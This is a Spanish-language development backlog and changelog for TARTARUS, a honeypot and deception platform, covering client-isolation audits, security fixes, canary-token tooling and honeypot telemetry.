  reinició y la ingesta se recuperó (1393 → 1394 eventos, `/health` ok); y con solo tráfico de sondas no
  toca nada. Variables nuevas: `LOG_WINDOW` (5m) y `AMQP_ERROR_PATTERN`.
  *Nota de método: la primera verificación que di por buena fue una ventana de 6 min que cayó en un
  momento tranquilo — insuficiente para un fallo con cooldown de 5 min.*



- ✅ ~~**Nota pendiente**: ~983 eventos en 70-84 por el *floor* de Sigma mal calibrado~~ **HECHO
  (26-ago)**. Al medirlo eran **1.284** los que había que tocar, no 983. Recalculados con
  `scripts/rescore_legacy_events.py`; hoy no queda ni un evento cuyo riesgo no cuadre con sus
  factores.

- 📋 **Nuevos pendientes del audit (a valorar, no bloquean):** opencanary marca `canary_triggered=True` →
  alerta en CADA evento (revisar); canary web-bug (`canary_router.py`) dispara con previsualizadores de
  enlaces benignos (sin auth, XFF spoofable); portscan (10 puertos/300s→75) con escáner corporativo
  legítimo; **implementar correlación real por Redis** para reactivar ssh_brute_force/ping_sweep en vez de
  solo saltarlas.

- ✅ ~~[10-ago-2026 · P0 · esfuerzo S] **Interfaz global de gestión de flocks**~~ **HECHO (25-ago-2026)**.
  El P0 agrupaba varios sub-ítems; la mayoría ya se habían cerrado en el trabajo de la consola de dos
  niveles (deploy_hub): **crear/borrar/entrar**, **estado de salud por cliente** (tarjetas con Atacantes /
  Alto riesgo / sparkline de 24h), **persistir el flock al recargar** (`localStorage tartarus_flock` +
  rehidratación con guard `_flockRehydrated`) y el **selector de vista `view-nav`** (`setView` valida la
  vista, sincroniza el tab activo y persiste/rehidrata en `tartarus_view`). El único faltante real era
  **renombrar**: se añadió el endpoint `PATCH /flocks/{flock_id}` (`rename_flock`, mismo patrón que
  `create`/`delete`: `can_mutate`, nombre requerido, chequeo de duplicados contra otros flocks, 404 si no
  existe; `is_default` inmutable) + botón "Renombrar" en cada tarjeta y `renameFlock()` en la UI (refresca
  el banner/selector sin salir si se renombra el flock activo). Tests: ruta PATCH en
  `test_flocks_router_exposes_crud_routes` + `test_rename_flock_rejects_empty_name`. Suite 1051 verde.
- ✅ ~~[10-ago-2026 · P1] Notificaciones por cliente~~ **HECHO** (commit `abd47e2`). Queda solo el
  **selector de cliente en la UI de ajustes de notificación** (el backend ya acepta `?flock_id`) →
  P1 · esfuerzo S · fecha objetivo: siguiente iteración de UI.
- ✅ ~~[10-ago-2026 · P1] **Push WebSocket scopeado por flock**~~ **HECHO (27-ago)** — y no era una
  mejora de UX, era una **fuga entre clientes**: `/ws/events` aceptaba conexiones SIN credenciales y
  emitía TODOS los eventos a TODOS los clientes (IP de origen y comando incluidos). Comprobado en
  vivo. Peor: activar la autenticación no lo habría tapado, porque `session_auth_middleware` se
  registra con `BaseHTTPMiddleware` y **Starlette no lo aplica a WebSockets**. Ver la novena tanda.
- ✅ ~~[10-ago-2026 · P2] Contraseñas con bcrypt~~ **HECHO** (commit `d25e562`). bcrypt opcional + rehash
  transparente; `bcrypt>=4.0.0` en requirements. Se activa del todo al **reconstruir la imagen del engine**
  (hoy instalado a mano en el contenedor para validar) → sub-tarea: rebuild en el próximo despliegue.
- ✅ ~~[10-ago-2026 · P2] **Reconstruir imagen del engine con `bcrypt`**~~ **HECHO (27-ago)**. Y era
  más urgente de lo que parecía: el `pip install` manual se había perdido, así que las contraseñas se
  llevaban semanas hasheando con SHA-256 **sin que nada lo dijera**. Imagen reconstruida (bcrypt
  5.0.0), aviso en el arranque si vuelve a faltar, y el algoritmo visible en `/health`.
- [10-ago-2026 (sesión autónoma) · P2 · esfuerzo S] **Regla `sigma_lite` sin modificador `all`.** Se
  esquivó con bloques combinados en la condición (T1136). Si aparecen más reglas que necesiten "todos los
  términos presentes", conviene añadir soporte de `|all` al evaluador. Fecha objetivo: por planificar.
- [10-ago-2026 (sesión autónoma) · P1 · BLOQUEADO] **Regla c2_encrypted_channel (T1573) depende de HASSH.**
  Requiere forkear Beelzebub (Go) para emitir el KEXINIT del cliente + columna `hassh` en events. Es la
  única de las 16 reglas del Tier 1 que falta. Fecha objetivo: por planificar (bloqueada por fuente de datos).
- [10-ago-2026 · P2 · esfuerzo S] **Puerto fantasma de OrbStack en 127.0.0.1:9000.** El motor corre en
  9001 como rodeo; conviene resolver la reserva fantasma para volver al 9000. Origen: rodeo repetido en
  varias sesiones. Fecha objetivo: por planificar.
- [10-ago-2026 · P2 · esfuerzo XL] **Plataforma de gestión de clientes (venta).** Ver la épica dedicada
  más abajo. Aquí solo como marca para no perderla. Fecha objetivo: por planificar (tras la venta).
- [10-ago-2026 (análisis Telnet) · P1 · esfuerzo M] **Telnet REAL en paralelo** (Cowrie o listener TCP en
  :23) + **respaldo estático en `telnet-23.yaml`** (no quedar mudo si la API LLM falla). El honeypot actual
  es SSH+LLM (Cisco), NO captura botnets IoT/Mirai (telnet crudo). Ver `docs/ANALISIS_TELNET.md`. Veredicto:
  éxito parcial, no garantía de éxito del cliente sin esto. Fecha objetivo: próxima ola de cobertura.
- [10-ago-2026 · P2 · esfuerzo M] **LLM local (Ollama) para los honeypots** — costo cero + sin dependencia
  de key paga; ideal en campo. `telnet-23.yaml` es LLM puro (mudo si la key se agota). Fecha objetivo: por planificar.
- [10-ago-2026 · P1 · esfuerzo L] **Construir el dashboard de despliegue (G-2/G-3/G-4)** — spec lista en
  `docs/DISENO_DASHBOARD_DESPLIEGUE.md`. G-4 (key/proveedor LLM por honeypot) **arregla el no-op de
  `POST /settings/beelzebub/ai`** y habilita OpenAI↔DeepSeek↔Ollama desde la UI. Fecha objetivo: próxima ola de UI.
- [10-ago-2026 · P1 · esfuerzo S] **Migrar honeypots a DeepSeek** cuando se agote el saldo de la key de
  GPT.rtf (~$4.67). Runbook listo: `docs/RUNBOOK_LLM_DEEPSEEK.md`. Fecha objetivo: al agotar saldo.
- ✅ [10-ago-2026] **CI secret-scan (C5) — HECHO** (`ci.yml`): antes solo pre-commit local. TF-13a sigue
  pendiente en su parte de rotar la key OpenAI real + secret store. Ver `docs/REVISION_SEGURIDAD_PENDIENTES.md`.

### 🐝 ÉPICA — Beelzebub: cobertura total ("sacarle todo el jugo") (10-ago-2026)

> Auditoría de capacidades del framework vs lo que usamos: `docs/AUDITORIA_BEELZEBUB.md`. Apartado vivo en
> la wiki: `[[actualizaciones-herramientas]]`. Alcance de la IA: `docs/ALCANCE_IA_TARTARUS.md` + `[[alcance-ia]]`.

- ✅ **HECHO (10-ago):** guardrails anti-jailbreak en ssh-22/telnet-23 (probado, resisten jailbreak);
  respaldo estático en telnet-23 (comandos Cisco top sin depender del LLM); validación de los YAML de
  Beelzebub en CI (`scripts/validate_beelzebub.py`).
- ✅ **HECHO (11-ago) — G-5: métricas Prometheus reales de Beelzebub recuperadas** (`beelzebub_events_*`):
  el host :2112 lo ocupa el honeypot falso, así que las reales estaban ocultas. Solución: mapear el :2112
  interno real a `:9112` en compose (sin quitar el señuelo) + `engine/engine/observability_router.py`
  (`GET /observability/beelzebub`) que raspa `http://beelzebub:2112/metrics` por la red interna y devuelve
  eventos por protocolo + total (resiliente: 200 con `reachable:false` si Beelzebub cae) + panel de salud
  `#svcHealthPanel` en la UI. 7 tests nuevos. Verificado E2E (contadores suben con el tráfico). Complementa
  el watchdog.
- ✅ **HECHO (11-ago) — Cierre de pendientes menores de la épica** (los tres que quedaron tras G-5):
  1. **Etiquetar hits del laberinto**: `engine/engine/maze_tagger.py` deduce si una petición HTTP cayó en
     el maze (su URI no casa con ningún handler real del YAML) e inyecta `maze_hit:true` en el payload
     (patrón `ssh_tool` en `consumer.py`); la UI muestra el badge `🌀 laberinto` en el feed. 9 tests
     nuevos. Beelzebub no marca el handler, por eso se deduce en el engine. Verificado E2E.
  2. **Grafana opcional**: perfil de compose `observability` (`docker compose --profile observability up -d
     prometheus grafana`) con Prometheus (rasca `beelzebub:2112` por red interna) + Grafana (:3300) y un
     dashboard auto-provisionado "Salud de honeypots". Cero contenedores si no se activa. Verificado
     (target UP, `beelzebub_events_total=386`, dashboard y datasource provisionados).
  3. **Mount rw de configs en prod**: `docker-compose.prod.yml` monta `beelzebub/configurations` en el
     engine + `TARTARUS_SERVICES_DIR`/`PERSONALITIES_DIR` → en prod ya funcionan personas, G-4 (LLM por UI)
     y el etiquetado de maze. Cierra el requisito de despliegue de G-4. Validado con `compose config`.
- ✅ **HECHO (10-ago) — Upgrade Beelzebub v3.8.0 → v3.9.0** (commit `858620e`): verificado E2E, no rompió
  nada. **Desbloqueó nativamente** telnet, TLS/HTTPS, multi-proveedor (`host`), MazeHoneypot, guardrail y
  config por JSON → varios pendientes de abajo se **abaratan** (pasan de "construir" a "configurar").
- ✅ **HECHO (11-ago) — Telnet NATIVO** (`protocol: telnet`): `telnet-23.yaml` migrado; captura telnet crudo/
  IoT (Mirai) conservando CLI Cisco LLM + respaldo estático + guardrails. Verificado (32 eventos TELNET).
  `attack_all.py::attack_telnet` vuelto a telnet interactivo. Cierra el hueco de `docs/ANALISIS_TELNET.md`.
- ✅ **HECHO (11-ago) — HTTPS/TLS NATIVO** (`tlsCertPath`/`tlsKeyPath`): honeypot HTTPS en :443 (host :8443)
  con cert autofirmado, sin nginx. Consumer: `dest_port=443` vía `TLSServerName` (protocol HTTP → reglas web
  siguen). Test en `test_consumer.py`. Cierra el estudio `docs/ESTUDIO_HTTPS_TLS.md`. Pendiente opcional:
  cert de CA de confianza + etiqueta HTTPS explícita.
- ✅ **HECHO (11-ago) — G-4: proveedor/key LLM por honeypot desde la UI** (commit `0ecbf84`):
  `POST /services/{file}/llm` + `personality_engine.set_llm` escriben el bloque plugin del YAML (OpenAI/
  DeepSeek/OpenRouter/Ollama vía provider+host). Sección "Proveedor LLM" en el modal de servicio. La key
  nunca se devuelve/loguea (C5). **Arregla el no-op** de `settings/beelzebub/ai` (marcado deprecado).
  E2E probado (loop gpt-4o↔gpt-4o-mini). **Requisito de despliegue:** el engine debe montar
  `beelzebub/configurations` con ESCRITURA (ya en dev-mac; añadir a prod si se gestiona desde la UI).
- ✅ **HECHO (11-ago) — MazeHoneypot (anti-escáner)**: fallback `plugin: "MazeHoneypot"` en `http-80.yaml` y
  `https-443.yaml` (reemplaza el 404 seco). Los escáneres (dirbuster/gobuster/nikto, `/.git`, `/admin/`,
  `/backup/`) reciben un laberinto infinito de directorios falsos con archivos tentadores (`.env`,
  `backup.tar.gz`, `database_dump.sql`) → se agotan y dejan telemetría. El portal `/` y `/login` siguen
  ganando por orden de regex. Verificado E2E con curl. **Etiquetado de hits en la UI: hecho** (ver arriba).
- ✅ **HECHO (11-ago) — Reconciliación de métricas (embudo de ingesta)**: el usuario notó que Grafana
  (754/45/736) no coincide con el panel Principal (1166/94/821). No es bug: 5 causas (ventana 24h+flock vs
  since-restart, taxonomía 5 buckets vs rica, source vs persisted, MODBUS sensor aparte, reset al reiniciar).
  Se construyó el **embudo** Beelzebub(fuente)→consumer(Redis)→BD(persistido): contadores por protocolo en
  Redis (`consumer:events_by_proto:*`), `GET /observability/reconcile` (brechas + `%`, distingue colapso de
  port-scan de pérdida real), panel `#ingestFunnelPanel` en la UI, y `scripts/compare_metrics.py --watch`.
  Verificado E2E: **consumer→BD 0.0% (sin pérdida)**; la brecha grande es colapso intencional de escaneos.
  Doc de referencia: `docs/OBSERVABILIDAD_METRICAS.md`.
- ✅ **HECHO (11-ago) — Grafana como benchmark de comparación**: dashboard reset-aware (`increase()` +
  anotación de reinicios), panel **fuente vs persistido** (segundo job Prometheus raspa `/metrics/tartarus`
  del engine). El peso gráfico principal se queda en los paneles nativos Canvas de TARTARUS.
- ✅ **HECHO (11-ago) — G-3: encender/apagar honeypots + reiniciar Beelzebub desde la UI**: `set_enabled`
  mueve el YAML a `services/disabled/` (Beelzebub deja de cargarlo; glob no recursivo); `POST
  /services/{file}/enabled` + toggle en la tarjeta; `POST /services/restart` deja un flag que el **watchdog
  del host** ejecuta (respeta C4, el engine no toca docker). Verificado E2E (apagar→disabled/, reencender
  restaura, flag→watchdog reinicia y borra). 16 tests nuevos.
- 🟡 **P2 — Ollama local** (nativo en v3.9.0; costo cero, campo); **MCP nativo**. Esf S–M.
- ✅ **HECHO (11-ago) — Hub de despliegue (deprecación segura)**: la sección "Honeypot Services" se reencuadró
  como **"Despliegue"** (vista Gestión, dentro del flock) con **tres familias** en tarjetas: **Honeypots**
  (grid existente con on/off/LLM/persona/reiniciar), **Sensores remotos** (`loadSensorsFamily` sobre
  `GET /sensors/status`, tarjetas de estado real), y **Deception** (barra de acciones + modal:
  clonar sitio → `/clone/web`, plantar cebo → `/canary-tokens` con `token_value` generado, plantar honey-cred
  → `/honey-credentials`). **Cero backend nuevo** (todos los endpoints existían). El wizard se conserva como
  **"Modo avanzado"** (escenarios + sensores por hardware). Se corrigió que el grid de servicios no seguía al
  flock activo (ahora en `refreshFlockViews`). Verificado E2E (3 familias + plantar cebo/cred).
- ✅ **HECHO (11-ago) — Retiro TOTAL de `wizard.js`**: se borraron las 1342 líneas del wizard de 5 pasos y su
  bloque de CSS/HTML. En su lugar, `ui/src/js/deploy_hub.js` (~660 líneas) monta el **despliegue de una sola
  pantalla** dentro del hub, con el layout sobrio de Thinkst (etiqueta a la izquierda, controles a la derecha):
  escenario (4 tarjetas con prellenado + bandera `scenario_overridden`), contexto, sistema destino (9 perfiles
  de hardware con modo/avisos), sensores (filas con casilla; ICMP expande subred CIDR/fantasmas/modo en línea),
  trampas sugeridas por SO (con condiciones SMB/SSH/MySQL/Windows), escaneo (sigilo IR vs normal), resumen vivo
  y un solo botón. Ejecuta contra `/api/deploy/execute` (+`/deploy/generate` best-effort) y pinta la tabla de
  componentes; al terminar, "Ir al hub" salta a la vista Gestión. **Cero backend nuevo.** Los 3 botones de
  entrada (encabezado, DRAS, familia Sensores) apuntan al nuevo modal. Verificado E2E (7 tests nuevos
  `deploy_hub.spec.ts`: 4 escenarios despliegan, override viaja en el payload, cambio de perfil, subform ICMP)
  y a mano en el navegador (IR Reactivo → sigilo → tabla parcial → salto al hub). Se retiraron los 2 specs del
  wizard.
- ✅ **HECHO (11-ago) — Rediseño del despliegue "honesto y accionable" (5 fases)**: tras el retiro del wizard,
  el usuario señaló que las secciones del modal prometían cosas que no se cumplían. Se rehízo por completo
  (`deploy_hub.js`, `main.js`, `sensor_registry_router.py`):
  1. **Escenarios honestos**: se quitaron los tiempos inventados (`duration`) y cada tarjeta ahora **desglosa
     qué activa y por qué** (`effects[]`: sigilo/escaneo/trampas con su razón). El `scenario` viaja igual.
  2. **Contexto claro**: se eliminó la casilla ambigua "amenaza activa" y los 3 radios de tipo de trabajo;
     una **pregunta directa de 2 opciones** ("Hay un atacante dentro ahora mismo" vs "Preparando defensas")
     controla el sigilo. `isStealth()` pasó a depender de `activeAttacker` (Purple Team también entra a sigilo).
  3. **Sistema destino** renombrado "¿Dónde se instala el sensor?" con ayuda honesta (define perfil, no arranca).
  4. **Sensores conscientes de IA**: cada Beelzebub dice "Usa IA — requiere API", cada OpenCanary "Solo
     detección". Al marcar un Beelzebub se consulta `GET /settings/ai`; si no hay key, aviso + botón
     "Configurar IA" (reusa el modal AI Settings). Cero backend nuevo.
  5. **Trampas homologadas**: se retiró el `plant_token` pobre; ahora se **genera el archivo-cebo real y se
     descarga** por los endpoints del registro general (`/canary-tokens/document|credential|bundle`), pidiendo
     **nombre y ruta editables** que enriquecen la alerta. Honey-creds con contrato correcto. Las trampas
     salieron de `/deploy/execute` (que quedó solo sensores+escaneo).
  6. **Escaneo → reconocimiento**: renombrado "Reconocer la red" con propósito; lee `GET /hosts` y **sugiere
     sensores** a partir de los servicios vistos (mapa servicio/puerto→sensor) con botón "Aplicar sugerencia";
     botón "Reconocer la red ahora" lanza `POST /scan` + polling.
  7. **Hub vivo**: las tarjetas de sensor ganan **Quitar** (nuevo `DELETE /sensors/registry/{id}` sobre
     `sensor_registry` — bajo `/registry/` para no chocar con el `DELETE /sensors/{id}` legacy de
     `remote_sensors`) y **reasignar flock** (cablea el `POST /sensors/{id}/flock` que ya existía). "Agregar
     hardware nuevo" se deja explícito como flujo de guion (C4: el engine no arranca contenedores).
  **Bug corregido**: `fetchAiStatus`/`fetchHostsSuggestion` llamaban `render()` completo desde un callback
  async, lo que **borraba la tabla de despliegue** si llegaban tarde (visible en el 1er E2E con engine frío);
  ahora actualizan solo su fragmento (`#dplAiBox` / `#dplSuggestBox`). **Bug corregido**: `deleteSensor`/
  `reassignSensor` no eran globales (main.js es módulo ES) → expuestas en `window`. Suite 1048 (+3 tests del
  DELETE); 10 E2E `deploy_hub.spec.ts` verdes; verificado a mano E2E (generar cebo con nombre/ruta → registro
  enriquecido; sugerencia por /hosts; quitar/reasignar sensor).
- ✅ **HECHO (11-ago) — Refinamiento crítico del despliegue (2ª pasada de feedback)**: el usuario evaluó el
  modal y detectó, con razón, piezas sin fundamento. Se corrigieron (todo UI salvo un endpoint de bundle):
  1. **Contexto → motor de recomendaciones**: "El sitio tiene internet" era **decorativo** (`state.hasInternet`
     sin uso funcional); ahora **afecta de verdad** (sin internet → el aviso de IA cambia a "los honeypots con
     IA en la nube no responderán" y lo recomienda). "Atacante activo" ya no solo cambia el escaneo: genera un
     **panel de recomendaciones concretas** (no escanear aún, plantar cebos primero). Nuevo `renderRecommendations`.
  2. **Semántica**: se eliminó "sigilo" de los textos de usuario (jerga) → "sin hacer ruido que delate las
     defensas". `isStealth()` se conserva como nombre interno.
  3. **Sensores — naturaleza explicada**: nota de que son **pasivos** (detectan/engañan, no bloquean ni
     contraatacan) y explicación del **ICMP Canary** como tripwire de IPs señuelo (sin relación 1:1 con otros
     sensores) + qué hace el modo responder/silencioso.
  4. **Trampas — catálogo "+" y un solo botón**: se añadió **"+ Añadir este cebo"** con el catálogo completo
     (~13 tipos del `#ccType`) → fila editable con quitar (`state.customTraps`). Se unificó en **un solo botón**
     "Generar cebos (paquete para plantar)" (se quitaron los dos redundantes). **Backend nuevo**: `POST
     /canary-tokens/bundle` que arma el ZIP **respetando nombre y ruta por cebo** (el GET usaba nombres fijos y
     perdía el enriquecimiento) — `_mint_bundle_bait` extendido con `custom_name`/`custom_location`; el INSERT de
     credencial ahora guarda `planted_location`. +2 tests.
  5. **Reconocimiento como paso previo opcional**: se reposicionó **antes** de sensores, enmarcado como opcional
     ("no requiere instalar nada"), aclarando que usa el mismo motor que Network Scanner; su resultado alimenta
     la sugerencia (ya lo hacía).
  Suite **1050** (+2 del bundle POST); **12 E2E** `deploy_hub.spec.ts` verdes (paquete respeta nombre/ruta,
  catálogo "+", sin-internet cambia aviso IA + recomendaciones). Verificado backend por curl (registro
  enriquecido). La verificación de la **descarga** del ZIP en navegador manual se bloquea por el diálogo del
  entorno de automatización → se cubre en Playwright headless.
- 🟡 **Pendiente futuro (anotado)**: despliegue tipo **USB autocargado** (token → carpeta destino en
  automático) — hoy es generación+descarga manual. Y **agregar hardware nuevo desde la UI** que arranque algo
  real vía el watchdog del host (investigar sin violar C4).
- 🔵 **Cola (siguiente):** cert de CA de confianza para HTTPS (P3); fix de raíz del canal AMQP "stale" — ahora
  **medible** con la brecha consumer→BD del embudo; Ollama local (P2).

### 🎯 AUDITORÍA DE COBERTURA DE PROTOCOLOS (10-ago-2026) — medido con `clean_attack_audit.sh`

> Se limpió todo, se atacaron todos los protocolos por el camino real (Beelzebub→pipeline) y se midió qué
> aterrizó de verdad en la base. Resultado: **136 eventos en Default** (SSH 54, HTTP 36, MCP 25, TCP 24,
> Prometheus 3) y **0 en el flock testigo (Iván) → sin fugas por el camino de producción**. Pero salieron
> huecos de cobertura reales:

**Cerrado el 10-ago-2026 (misma jornada):**
- ✅ **P1 — Telnet 0 eventos (HECHO, commit `0226ee9`):** causa raíz = `attack_all.py::attack_telnet` usaba
  socket TCP crudo contra un servidor SSH (Beelzebub no tiene telnet nativo; `:23` es SSH+LLM a propósito).
  El consumer ya reclasificaba `:23`→TELNET bien. Fix: el ataque ahora usa SSH (como `attack_telnet.sh`).
  Verificado: `by_protocol.TELNET=28`.
- ✅ **P1 — Pipeline AMQP frágil (HECHO, commit `8a2889c`):** `scripts/beelzebub_watchdog.sh` (host) sondea
  `/health` (`checks.ingestion == stale`) y reinicia Beelzebub con cooldown anti-flapping. Cierra el lazo
  sin violar C4 (el host sí puede correr docker). El consumer del engine ya se auto-recuperaba. Verificado.
- ✅ **P2 — Cobertura Modbus/ICMP/Prometheus (HECHO, commit `e4820c7`):** `attack_modbus.sh` (tramas Modbus
  TCP crudas, sin pymodbus; verificado 10 eventos MODBUS con el sensor levantado), `attack_icmp.sh`
  (ping a ghost IPs; verificable en campo), `attack_prometheus.sh` (verificado 14 eventos PROMETHEUS).
- 🔵 **HTTPS (:8443) — EN ESTUDIO (HECHO el análisis, commit `90dbf7d`):** `docs/ESTUDIO_HTTPS_TLS.md` +
  página de competencia en la wiki. Conclusión: HTTPS es capacidad esperada (Thinkst y OpenCanary la
  ofrecen) → **conviene desplegarla, P2, esfuerzo M** (terminación TLS con nginx delante del honeypot HTTP
  de Beelzebub, certificado configurable como Thinkst). Pendiente: decidir despliegue y qué hacer con la
  sección HTTPS falsa de `attack_all.py` mientras tanto. **Thinkst Canary establecido como benchmark.**
- 🟠 **P1/seguridad — 2 claves OpenAI en claro** en `beelzebub/configurations/services/ssh-22.yaml` y
  `telnet-23.yaml` (gitignoreadas, no en git, pero en disco). Rotar + secreto en reposo. = TF-13a. Esfuerzo S–M.

### ✅ HECHO en esta sesión — Épico "Consola de Canarios" (Fases A–D)
- **A. Circuito de disparo garantizado + probado.**
  - xlsx → imagen externa (drawing OOXML) → dispara al ABRIR, no al click (`canary_docgen.make_xlsx`).
  - `plant_token` registra `decoy_reuse` (Sigma critical) para **todos** los cred (ssh-key,
    kubeconfig, gitconfig, env-file, mysql-dump, wireguard, browser-cookie, sensitive-cmd +
    aws/slack) con **secreto único por-plant** embebido; recarga reglas tras registrar.
  - `POST /detections/reload`. Fix de scoring: `max()` sobre niveles Sigma era lexicográfico
    ("medium">"critical") y enmascaraba críticos → ahora por rango (`consumer._LEVEL_RANK`).
  - `GET /canary-tokens/base-url` + `TARTARUS_CANARY_BASE_URL` en compose (alcanzable en LAN).
  - `test_canary_fire_matrix.py`: cada tipo → mecanismo → dispara → alerta (16 tests).
- **B. Modelo de datos de despliegue.** `canary_tokens` += `deployment_method` / `status` /
  `reported_path` / `deployed_at` / `aged_date` (idempotente en `schema.ensure_schema`).
  `POST` extendido + `PATCH /canary-tokens/{id}`; disparo → `status='triggered'`.
- **C. Consola completa** (`#canarySection`, Canvas puro): tarjetas con estado + método +
  ruta reportada editable (PATCH en vivo), copy honesto de qué dispara cada tipo, leyenda,
  aviso de base-url localhost, método en el form de creación.
- **D. Despliegue asistido.** `canary_bundle.build_bundle` (ZIP: cebos/ + `plantar.py`
  timestomp + LEEME honesto + rutas.txt). `GET /canary-tokens/bundle` (mintea 1 de cada tipo)
  y `POST /canary-tokens/email` (envía al cliente vía SMTP del notifier;
  `Notifier.send_email_attachment`).

### ✅ HECHO (ago-09) — Modelo central/flock tipo Thinkst Nest
- Panel central = solo administración (tarjetas de flock + feed de alertas global etiquetado por flock
  + usuarios/notificaciones/auditoría). Despliegue de deception (cebos/honey/sensores/DRAS/scanner) y
  monitoreo profundo viven **solo dentro de un flock**. Default es un flock que se entra por su UUID;
  `''` = panel central. Backfill NULL→Default en canary/honey/sensores/eventos; borrar flock re-hogar al
  Default (nada global). `applyViewLevel` re-particionado (`_CENTRAL_ONLY`/`_FLOCK_ONLY`), commits `ea45ee5`+`02e4917`.
- Pendiente relacionado (agendado): **notificaciones por-flock** (hoy la config es global) y **push WS
  scopeado por flock** (hoy el feed es polling scopeado; el WS global está sin usar).

### 🔒 AUDITORÍA DE HERMETICIDAD DE FLOCKS (ago-2026) — triada CIA

**Contexto:** el cliente exigió flocks 100% herméticos (incl. reportes/exportación). Se auditó todo
con un harness determinista (`scripts/audit_flock_isolation.py`: 2 flocks marcados, 19 superficies,
loop). Resultado tras las correcciones: **0 fugas en 5 rondas**, incluidos reportes y CSV/STIX.

**Confidencialidad — CERRADO (commit `17d167c`):**
- Fuga visual front-end (DOM/caché sin limpiar al cambiar de flock) → `_clearScopedViews`, else-clear
  en credenciales/kill-chain, reset de `_cachedAttackSummary`.
- Reportes de engagement + 6 fuentes (correlación/clusters/cadenas/MITRE/IOCs/narrativa) + PDF/HTML
  por-id + exportación (CSV/normalized/STIX) NO scopeaban → ahora `flock_id` en todas las queries. La
  última fuga era la query de ventana en `correlate_around_detections`.
- `/hosts` observed dedupe global → por flock; backfill hosts NULL→Default.
- Guardarraíl: `engine/tests/test_report_export_flock_scope.py` (el scope no se puede quitar sin romper CI).

**Correcciones de la segunda pasada — CERRADO (10-ago-2026):**
- ✅ **P1 — Integridad de mutaciones (HECHO):** `PATCH/DELETE /canary-tokens/{id}`, `DELETE /canary-tokens`
  (limpiar todo, antes SIN `WHERE`), `DELETE /honey-credentials/{id}` y el `acknowledge`/`ignore` por-IP
  ahora dependen de `flock_scope` y filtran por `flock_id` → un cliente ya no puede borrar/editar lo de
  otro; "limpiar todo" solo afecta al cliente activo. Guardarraíl `tests/test_mutation_flock_scope.py`.
- ✅ **P2 — Disponibilidad (parcial, HECHO):** el freno anti-repetición (`alert_sent`) lleva prefijo de
  flock (`alert_sent:{flock}:{scope}`) y el set de IPs silenciadas es por flock (`ignored_ips:{flock}`);
  silenciar en un cliente ya no silencia en otro. Falta aún cuotas de recursos por flock (ver pendientes).
- ✅ **P3 — Watermark de flock en reportes (HECHO):** el reporte de engagement estampa
  "Cliente / Flock: <nombre>" en el encabezado (`report_router._resolve_flock_label`).
- ✅ **P0 — RBAC: verificado y documentado (HECHO como decisión):** la barrera de aislamiento por rol ya
  existía (`flock_scope` clampa y hace 403 a manager/watcher que pidan otro flock; `users.flock_id`, JWT).
  Estaba *dormida* porque `TARTARUS_SESSION_AUTH` viene apagado (modo dev/operador único). Se añadió el
  test `tests/test_mutation_flock_scope.py` (manager pidiendo otro flock → 403; clamp al propio) y la guía
  `docs/SEGURIDAD_MULTITENANT.md` para encender producción. **Decisión:** se deja OFF por defecto (dev);
  activar auth en el primer despliegue multi-cliente real (ver pendientes con fecha).

**Correcciones de la tercera pasada — sesión autónoma CERRADO (10-ago-2026):**
- ✅ **Fuga visual de canarios entre clientes (HECHO):** era DOM rancio en la consola (la lista de cebos
  y de credenciales trampa hacían `return` en 0 elementos sin limpiar el grid → quedaban pintados los del
  cliente anterior). Se limpia en vacío + se blanquea al cambiar de cliente + las mutaciones mandan el
  flock activo. Además `scripts/audit_flock_isolation.py` era DESTRUCTIVO (borraba datos reales al correr):
  ahora acota su limpieza a los flocks de auditoría. Commit `028b945`. Nuevo `scripts/seed_demo.py`.
- ✅ **P1 — Notificaciones por-flock (HECHO, commit `abd47e2`):** config y enrutamiento de alertas por
  cliente. Tabla `notify_config_flock` (la global id=1 queda como Default/fallback); `Notifier.config_for`
  elige la del cliente o cae a la global; `send` enruta por `event.flock_id`; los 4 endpoints aceptan
  `?flock_id`. Tests `test_notify_per_flock.py`. **Falta solo el selector de cliente en la UI de ajustes**
  (el backend ya lo soporta) → ver PENDIENTES IMPLÍCITOS.
- ✅ **P2 — Contraseñas con bcrypt (HECHO, commit `d25e562`):** bcrypt opcional con degradación a SHA-256,
  verificación compatible con hashes viejos, rehash transparente en el login. `bcrypt>=4.0.0` en
  requirements (se activa al reconstruir la imagen). Tests `test_password_hashing.py`.

**Vulnerabilidades PENDIENTES (priorizadas, con fecha objetivo):**
- 🔴 **P0 — Activar RBAC en el primer despliegue multi-cliente (fecha objetivo: al vender/compartir el
  servicio, estimado sep-2026):** poner `TARTARUS_SESSION_AUTH=true`, `TARTARUS_JWT_SECRET` propio, crear
  usuarios manager/watcher atados a su flock, cambiar la contraseña de admin de fábrica. Sin esto, la
  hermeticidad depende de que el operador elija su flock, no de una barrera forzada. Esfuerzo S (config).
- 🟡 **P2 — Disponibilidad (cuotas por flock) (fecha objetivo: por planificar):** el rate-limit de alertas
  y las IPs silenciadas ya son por flock, pero los pools de conexión y el cómputo siguen compartidos → un
  cliente muy ruidoso puede afectar a otro. Falta cuota de recursos por flock. Esfuerzo M.
- 🟡 **P2 — Enrutamiento del ingreso (fecha objetivo: por planificar):** el tráfico sin `assignment` cae al
  Default (consumer COALESCE), no al flock del cliente. Los assignments (por source_ip/CIDR/sensor) son
  obligatorios para aislar el ingreso real; falta UI que obligue/valide esto al enrolar un cliente. Esfuerzo M.

### 🆕 ÉPICA — Plataforma de gestión de clientes (para vender el servicio) · P2 · Esfuerzo XL

> Registrada el **10-ago-2026** a pedido del usuario. Es una épica de PRODUCTO, no se construye aún.
> Aquí queda el norte para no perder la idea.

**Objetivo.** Cuando TARTARUS se venda o se ofrezca como servicio a otra empresa de seguridad, hace falta
un panel propio desde el cual **nosotros** (o la empresa que lo compre) veamos, de un vistazo, todas las
instalaciones de TARTARUS de cada cliente: qué tienen desplegado (cebos, sensores, honeypots), su estado
de salud (en línea/caído, última señal), volumen de alertas, y poder dar **soporte y resolución de
problemas** a distancia. Es la vista "de proveedor", por encima de los flocks de una sola instalación.

**Distinción clave (no confundir con los flocks).** Los flocks separan clientes *dentro de una misma
instalación*. Esta épica es un nivel por encima: coordina *varias instalaciones* de TARTARUS, cada una
posiblemente con sus propios flocks. Panel central de instalación ≠ panel de proveedor multi-instalación.

**Decisión de arquitectura ABIERTA (no cerrar aún) — dos caminos:**
1. **Aplicación aparte que se conecta por API a cada instalación.** Un panel de proveedor independiente
   que consulta la API de cada TARTARUS desplegado (salud, inventario, alertas) y centraliza soporte.
   Ventaja: no toca el producto que usa el cliente; aislamiento fuerte. Reto: cada instalación debe
   exponer una API de gestión autenticada y alcanzable (o llamar a casa por un canal seguro).
